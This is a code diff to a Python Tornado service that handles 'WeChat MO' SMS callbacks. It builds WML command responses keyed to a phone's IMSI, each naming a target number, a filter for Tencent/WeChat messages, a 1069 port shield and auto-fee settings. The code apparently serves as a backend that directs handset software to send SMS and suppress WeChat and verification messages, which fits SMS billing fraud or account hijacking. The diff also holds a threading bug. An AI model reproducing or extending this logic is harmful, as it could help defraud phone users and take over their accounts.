@@ -13,6 +13,7 @@ import config
 from log import logger
 import public
 import MySQLdb
+from pymongo import MongoClient
 from gevent.greenlet import Greenlet
 from gevent import monkey
 monkey.patch_all()
@@ -21,6 +22,7 @@ poolConfig = PooledDB(MySQLdb, 5, host=config.GLOBAL_SETTINGS['config_db']['host
                       'config_db']['psw'], db=config.GLOBAL_SETTINGS['config_db']['name'], port=config.GLOBAL_SETTINGS['config_db']['port'], setsession=['SET AUTOCOMMIT = 1'], cursorclass=MySQLdb.cursors.DictCursor, charset="utf8")
 poolLog = PooledDB(MySQLdb, 5, host=config.GLOBAL_SETTINGS['log_db']['host'], user=config.GLOBAL_SETTINGS['log_db']['user'], passwd=config.GLOBAL_SETTINGS[
     'log_db']['psw'], db=config.GLOBAL_SETTINGS['log_db']['name'], port=config.GLOBAL_SETTINGS['log_db']['port'], setsession=['SET AUTOCOMMIT = 1'], cursorclass=MySQLdb.cursors.DictCursor, charset="utf8")
+gMongoCli = MongoClient(config.GLOBAL_SETTINGS['mongodb'])
 
 systemConfigs = {}
 channelConfigs = {}
@@ -263,9 +265,9 @@ def insert_register_log(_info):
 
 def insert_weixinMo_log(_info):
     _dbLog = poolLog.connection()
-    _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`,`para06`) values (%s,%s,%s,%s,%s,%s,%s,%s)'
+    _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`) values (%s,%s,%s,%s,%s,%s,%s)'
     _paras = [long(round(time.time() * 1000)) * 10000 + random.randint(0, 9999), 333,
-              _info["mobile"], _info["spcode"], _info["ip"], _info["spnumber"], _info["msg"], _info["imsi"]]
+              _info["mobile"], _info["spcode"], _info["ip"], _info["spnumber"], _info["msg"]]
     _dbLog.cursor().execute(_sql, _paras)
     _dbLog.close()
     return
@@ -273,66 +275,74 @@ def insert_weixinMo_log(_info):
 WXMO_CONTENT = '<?xml version="1.0" encoding="UTF-8"?><wml><card><Ccmd_cust>[cmd]</Ccmd_cust><Cnum_cust>[targetNum]</Cnum_cust><filter1_cust>腾讯科技|微信</filter1_cust><filter2_cust></filter2_cust><Creconfirm_cust></Creconfirm_cust><PortShield>1069</PortShield><fee></fee><autofee>1</autofee><feemode>11</feemode></card></wml>'
 
 
-def proc_weixinMo(info):
-    dbConfig = poolConfig.connection()
-    _cur = dbConfig.cursor()
-    _sql = "select expiredTime from test_responses where imsi=%s and testStatus='wxmo'"
-    _paras = [info['imsi']]
-    _cur.execute(_sql, _paras)
-    _recordRsp = _cur.fetchone()
-    wxmoRsp = WXMO_CONTENT.replace(
-        '[cmd]', str(info['msg'])).replace('[targetNum]', str(info['spnumber']))
-    if _recordRsp != None:
-        expiredTime = round(time.time()) + 3600
-        if expiredTime < int(_recordRsp['expiredTime']):
-            expiredTime = int(_recordRsp['expiredTime'])
-        _sql = "update `test_responses` set expiredTime=%s,response=%s where imsi = %s  and testStatus='wxmo'"
-        _paras = [expiredTime, wxmoRsp, info['imsi']]
+def proc_weixinMo(self, info):
+    doc = gMongoCli.sms.wechat_mos.find_one({"_id": info['mobile']})
+    if doc != None:
+        dbConfig = poolConfig.connection()
+        _cur = dbConfig.cursor()
+        _sql = "select expiredTime from test_responses where imsi=%s and testStatus='wxmo'"
+        _paras = [doc['imsi']]
         _cur.execute(_sql, _paras)
-    else:
-        _sql = "insert into test_responses (imsi,testStatus,expiredTime,response) values (%s,'wxmo',unix_timestamp(now())+3600,%s)"
-        _paras = [info['imsi'], wxmoRsp]
-        _cur.execute(_sql, _paras)
-    _sql = 'select testStatus,expiredTime from test_imsis where imsi=%s'
-    _paras = [info['imsi']]
-    _cur.execute(_sql, _paras)
-    _recordRsp = _cur.fetchone()
-    if _recordRsp != None:
-        expiredTime = round(time.time()) + 3600
-        if expiredTime < int(_recordRsp['expiredTime']):
-            expiredTime = int(_recordRsp['expiredTime'])
-        if _recordRsp['testStatus'] == 'wxmo':
-            _sql = "update `test_imsis` set expiredTime=%s,remark=%s,mobile=%s where imsi = %s"
+        _recordRsp = _cur.fetchone()
+        wxmoRsp = WXMO_CONTENT.replace(
+            '[cmd]', str(info['msg'])).replace('[targetNum]', str(info['spnumber']))
+        if _recordRsp != None:
+            expiredTime = round(time.time()) + 3600
+            if expiredTime < int(_recordRsp['expiredTime']):
+                expiredTime = int(_recordRsp['expiredTime'])
+            _sql = "update `test_responses` set expiredTime=%s,response=%s where imsi = %s  and testStatus='wxmo'"
+            _paras = [expiredTime, wxmoRsp, doc['imsi']]
+            _cur.execute(_sql, _paras)
         else:
-            _sql = "update `test_imsis` set expiredTime=%s,remark=%s,mobile=%s,testStatus='wxmo' where imsi = %s"
-        _paras = [expiredTime, info['msg'], info['mobile'], info['imsi']]
+            _sql = "insert into test_responses (imsi,testStatus,expiredTime,response) values (%s,'wxmo',unix_timestamp(now())+3600,%s)"
+            _paras = [doc['imsi'], wxmoRsp]
+            _cur.execute(_sql, _paras)
+        _sql = 'select testStatus,expiredTime from test_imsis where imsi=%s'
+        _paras = [doc['imsi']]
         _cur.execute(_sql, _paras)
+        _recordRsp = _cur.fetchone()
+        if _recordRsp != None:
+            expiredTime = round(time.time()) + 3600
+            if expiredTime < int(_recordRsp['expiredTime']):
+                expiredTime = int(_recordRsp['expiredTime'])
+            if _recordRsp['testStatus'] == 'wxmo':
+                _sql = "update `test_imsis` set expiredTime=%s,remark=%s,mobile=%s where imsi = %s"
+            else:
+                _sql = "update `test_imsis` set expiredTime=%s,remark=%s,mobile=%s,testStatus='wxmo' where imsi = %s"
+            _paras = [expiredTime, info['msg'],
+                      info['mobile'], doc['imsi']]
+            _cur.execute(_sql, _paras)
+        else:
+            _sql = "insert into test_imsis (imsi,testStatus,expiredTime,remark,mobile) values (%s,'wxmo',unix_timestamp(now())+3600,%s,%s)"
+            _paras = [doc['imsi'], info['msg'], info['mobile']]
+            _cur.execute(_sql, _paras)
+        _sql = "insert into wait_send_ads (targetMobile,msg,createTime,oriContent) values (%s,'ztldxtest',unix_timestamp(now()),%s)"
+        _paras = [info['mobile'], info['msg']]
+        _cur.execute(_sql, _paras)
+        _cur.close()
+        dbConfig.close()
+        self.write("ok")
     else:
-        _sql = "insert into test_imsis (imsi,testStatus,expiredTime,remark,mobile) values (%s,'wxmo',unix_timestamp(now())+3600,%s,%s)"
-        _paras = [info['imsi'], info['msg'], info['mobile']]
-        _cur.execute(_sql, _paras)
-    _sql = "insert into wait_send_ads (targetMobile,msg,createTime,oriContent) values (%s,'ztldxtest',unix_timestamp(now()),%s)"
-    _paras = [info['mobile'], info['msg']]
-    _cur.execute(_sql, _paras)
-    _cur.close()
-    dbConfig.close()
+        self.write('{"err":"mobile have no record"}')
 
 
 class WeiXinMoHandler(tornado.web.RequestHandler):
 
     def get(self, spCode):
-        self.write("ok")
-        self.finish()
+        # self.write("ok")
+        # self.finish()
         _ip = self.request.remote_ip
         if spCode == 'dexing':
             info = {'spcode': spCode, 'spnumber': self.get_argument('spnumber'), 'mobile': self.get_argument(
-                'mobile'),  'msg': self.get_argument('replyinfo'), 'ip': _ip, 'imsi': self.get_argument('ccpara')}
+                'mobile'),  'msg': self.get_argument('replyinfo'), 'ip': _ip}
         else:
-            print('error : no interface')
+            logger.error('error : no interface')
+            self.write("error : no interface")
             return
+        proc_weixinMo(self, info)
         threads = []
         threads.append(threading.Thread(target=insert_weixinMo_log(info)))
-        threads.append(threading.Thread(target=proc_weixinMo(info)))
+        # threads.append(threading.Thread(target=proc_weixinMo(info)))
         for t in threads:
             t.start()
 
